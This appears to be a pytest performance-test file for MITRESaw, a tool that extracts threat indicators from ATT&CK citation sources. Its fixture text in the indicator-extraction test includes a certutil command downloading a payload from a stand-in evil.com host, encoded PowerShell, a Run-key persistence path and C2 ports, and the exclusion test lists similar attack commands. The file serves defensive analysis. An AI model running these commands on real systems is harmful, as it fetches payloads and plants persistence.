"""Performance diagnostic tests for MITRESaw.

Run: python3 -m pytest tests/test_performance.py -v -s
The -s flag shows print output for timing results.
"""

import json
import os
import re
import time
from pathlib import Path


# ---------------------------------------------------------------------------
# Test 1: STIX data loading speed
# ---------------------------------------------------------------------------

def test_stix_loading_time():
    """How long does it take to load the STIX JSON bundle?"""
    stix_path = Path("data/stix/enterprise-attack.json")
    if not stix_path.exists():
        # Try alternate locations
        for alt in [Path("stix_data/enterprise-attack.json"),
                    Path("src/scripts/.cache_enterprise_attack.json")]:
            if alt.exists():
                stix_path = alt
                break
    if not stix_path.exists():
        print("  SKIP: No STIX data found")
        return

    start = time.time()
    with open(stix_path) as f:
        bundle = json.load(f)
    elapsed = time.time() - start
    obj_count = len(bundle.get("objects", []))
    size_mb = stix_path.stat().st_size / 1024 / 1024
    print(f"\n  STIX load: {elapsed:.2f}s ({size_mb:.1f} MB, {obj_count} objects)")
    assert elapsed < 30, f"STIX loading took {elapsed:.1f}s — too slow"


# ---------------------------------------------------------------------------
# Test 2: Citation cache read speed
# ---------------------------------------------------------------------------

def test_cache_read_speed():
    """How fast can we read all cached citations?"""
    cache_dir = Path("data/.citation_cache")
    if not cache_dir.exists():
        # Try root
        cache_dir = Path(".citation_cache")
    if not cache_dir.exists():
        print("  SKIP: No citation cache found")
        return

    files = list(cache_dir.glob("*.json"))
    if not files:
        print("  SKIP: Citation cache is empty")
        return

    start = time.time()
    success = 0
    failed = 0
    total_text = 0
    for f in files:
        try:
            data = json.loads(f.read_text())
            text = data.get("text", "")
            if text:
                success += 1
                total_text += len(text)
            else:
                failed += 1
        except Exception:
            failed += 1
    elapsed = time.time() - start

    print(f"\n  Cache read: {elapsed:.2f}s for {len(files)} files")
    print(f"    Success: {success}, Failed: {failed}")
    print(f"    Total text: {total_text / 1024 / 1024:.1f} MB")
    print(f"    Avg per file: {elapsed / len(files) * 1000:.1f}ms")
    assert elapsed < 60, f"Cache read took {elapsed:.1f}s — too slow for {len(files)} files"


# ---------------------------------------------------------------------------
# Test 3: Indicator extraction speed
# ---------------------------------------------------------------------------

def test_indicator_extraction_speed():
    """How fast is extract_indicators_from_text on real content?"""
    from src.citation_collector import extract_indicators_from_text

    # Generate a realistic test text
    sample = """
    The threat actor used `certutil -urlcache -split -f http://evil.com/payload.exe C:\\Windows\\Temp\\update.exe`
    to download the initial payload. They then executed `powershell -enc SQBFAFgA` for obfuscation.
    Registry persistence was established at HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdate.
    The malware communicated over TCP/4444 and TCP/8080 to the C2 server at 10.0.0.1:9090.
    Additional tools included mimikatz.exe, procdump64.exe, and PsExec.exe.
    CVE-2021-34527 (PrintNightmare) and CVE-2020-1472 (Zerologon) were exploited.
    Files were staged in C:\\Windows\\Temp\\staging\\ and /tmp/exfil/ before exfiltration.
    """ * 10  # Repeat for realistic page length

    iterations = 100
    start = time.time()
    for _ in range(iterations):
        result = extract_indicators_from_text(sample)
    elapsed = time.time() - start

    print(f"\n  Indicator extraction: {elapsed:.2f}s for {iterations} iterations")
    print(f"    Avg per call: {elapsed / iterations * 1000:.1f}ms")
    print(f"    Text length: {len(sample)} chars")
    print(f"    Indicators found: {sum(len(v) for v in result.values())}")
    for k, v in result.items():
        print(f"      {k}: {v[:3]}{'...' if len(v) > 3 else ''}")

    assert elapsed < 10, f"Extraction took {elapsed:.1f}s for {iterations} calls — too slow"


# ---------------------------------------------------------------------------
# Test 4: Relevance extraction speed
# ---------------------------------------------------------------------------

def test_relevance_extraction_speed():
    """How fast is _extract_relevant_passages?"""
    from src.citation_collector import _extract_relevant_passages

    # Simulate a long page
    paragraphs = []
    for i in range(100):
        if i % 10 == 0:
            paragraphs.append(f"APT29 used PowerShell to execute commands on target systems using T1059.001. "
                              f"The group deployed mimikatz for credential dumping in paragraph {i}.")
        else:
            paragraphs.append(f"This is unrelated content about cooking recipes and sports news in paragraph {i}. "
                              f"Nothing relevant to cybersecurity here at all.")
    text = "\n\n".join(paragraphs)

    iterations = 100
    start = time.time()
    for _ in range(iterations):
        result = _extract_relevant_passages(text, "APT29", "PowerShell", "T1059.001")
    elapsed = time.time() - start

    print(f"\n  Relevance extraction: {elapsed:.2f}s for {iterations} iterations")
    print(f"    Avg per call: {elapsed / iterations * 1000:.1f}ms")
    print(f"    Input: {len(text)} chars, {len(paragraphs)} paragraphs")
    print(f"    Output: {len(result)} chars")

    assert elapsed < 10, f"Relevance extraction took {elapsed:.1f}s — too slow"


# ---------------------------------------------------------------------------
# Test 5: Exclusion list speed
# ---------------------------------------------------------------------------

def test_exclusion_filter_speed():
    """How fast is the exclusion filter?"""
    from src.exclusions import filter_indicators, reload

    reload()  # Force fresh load

    indicators = {
        "cmd": ["certutil -urlcache", "powershell -enc", "net user /domain", "whoami"],
        "reg": ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Update"],
        "paths": ["C:\\Windows\\Temp\\evil.exe", "/tmp/exfil/data.tar.gz"],
        "software": ["mimikatz.exe", "procdump64.exe", "PsExec.exe"],
        "cve": ["CVE-2021-34527", "CVE-2020-1472"],
        "ports": ["4444", "8080", "3389"],
    }

    iterations = 10000
    start = time.time()
    for _ in range(iterations):
        filtered, excluded = filter_indicators(indicators)
    elapsed = time.time() - start

    print(f"\n  Exclusion filter: {elapsed:.2f}s for {iterations} iterations")
    print(f"    Avg per call: {elapsed / iterations * 1000:.2f}ms")
    print(f"    Input: {sum(len(v) for v in indicators.values())} indicators")
    print(f"    Filtered: {sum(len(v) for v in filtered.values())}, Excluded: {len(excluded)}")

    assert elapsed < 5, f"Exclusion filter took {elapsed:.1f}s — too slow"


# ---------------------------------------------------------------------------
# Test 6: Citation pre-count speed
# ---------------------------------------------------------------------------

def test_citation_precount_speed():
    """How fast can we pre-count (group, citation) pairs from consolidated_procedures?"""
    stix_path = Path("data/stix/enterprise-attack.json")
    if not stix_path.exists():
        for alt in [Path("stix_data/enterprise-attack.json"),
                    Path("src/scripts/.cache_enterprise_attack.json")]:
            if alt.exists():
                stix_path = alt
                break
    if not stix_path.exists():
        print("  SKIP: No STIX data found")
        return

    with open(stix_path) as f:
        bundle = json.load(f)

    # Simulate building procedures with citations
    procedures = []
    for obj in bundle.get("objects", []):
        if obj.get("type") == "relationship" and obj.get("description"):
            desc = obj["description"]
            if "(Citation:" in desc:
                # Build a fake ||‐delimited entry
                procedures.append(f"G0001||TestGroup||T1059||PowerShell||{desc}||-||desc||desc||det||Windows||ds||Execution||Enterprise")

    if not procedures:
        print("  SKIP: No procedures with citations found")
        return

    start = time.time()
    pre_seen = set()
    total = 0
    for p in procedures:
        parts = p.split("||")
        group = parts[1].strip().lower()
        all_text = parts[4]
        for cn in re.findall(r"\(Citation:\s*([^)]+)\)", all_text):
            key = (group, cn.strip())
            if key not in pre_seen:
                pre_seen.add(key)
                total += 1
    elapsed = time.time() - start

    print(f"\n  Citation pre-count: {elapsed:.2f}s")
    print(f"    Procedures scanned: {len(procedures)}")
    print(f"    Unique (group, citation) pairs: {total}")

    assert elapsed < 10, f"Pre-count took {elapsed:.1f}s — too slow"


# ---------------------------------------------------------------------------
# Test 7: HTML to text speed
# ---------------------------------------------------------------------------

def test_html_to_text_speed():
    """How fast is html_to_text on realistic HTML?"""
    from src.citation_collector import html_to_text

    # Simulate a realistic web page
    html = "<html><head><title>Test</title><style>body{color:red}</style></head><body>"
    for i in range(200):
        html += f"<div><h2>Section {i}</h2><p>APT29 used PowerShell to execute commands. "
        html += f"The malware was found at C:\\Windows\\Temp\\evil{i}.exe.</p>"
        html += f"<script>var x = {i};</script></div>"
    html += "</body></html>"

    iterations = 50
    start = time.time()
    for _ in range(iterations):
        text = html_to_text(html)
    elapsed = time.time() - start

    print(f"\n  HTML to text: {elapsed:.2f}s for {iterations} iterations")
    print(f"    Avg per call: {elapsed / iterations * 1000:.1f}ms")
    print(f"    Input: {len(html)} chars HTML")
    print(f"    Output: {len(text)} chars text")

    assert elapsed < 10, f"HTML parsing took {elapsed:.1f}s — too slow"


# ---------------------------------------------------------------------------
# Test 8: Cache write speed
# ---------------------------------------------------------------------------

def test_cache_write_speed():
    """How fast can we write cache entries?"""
    import tempfile
    from src.citation_collector import _write_cache, _read_cache, CACHE_DIR

    original_cache = CACHE_DIR
    with tempfile.TemporaryDirectory() as tmpdir:
        # Temporarily redirect cache
        import src.citation_collector as cc
        cc.CACHE_DIR = Path(tmpdir)

        sample_text = "APT29 used PowerShell to execute commands. " * 100

        iterations = 100
        start = time.time()
        for i in range(iterations):
            _write_cache(f"https://example.com/page{i}", sample_text, "test")
        write_elapsed = time.time() - start

        start = time.time()
        for i in range(iterations):
            _read_cache(f"https://example.com/page{i}")
        read_elapsed = time.time() - start

        # Restore
        cc.CACHE_DIR = original_cache

    print(f"\n  Cache write: {write_elapsed:.2f}s for {iterations} writes ({write_elapsed/iterations*1000:.1f}ms each)")
    print(f"  Cache read:  {read_elapsed:.2f}s for {iterations} reads ({read_elapsed/iterations*1000:.1f}ms each)")

    assert write_elapsed < 10, f"Cache write took {write_elapsed:.1f}s — too slow"
    assert read_elapsed < 5, f"Cache read took {read_elapsed:.1f}s — too slow"
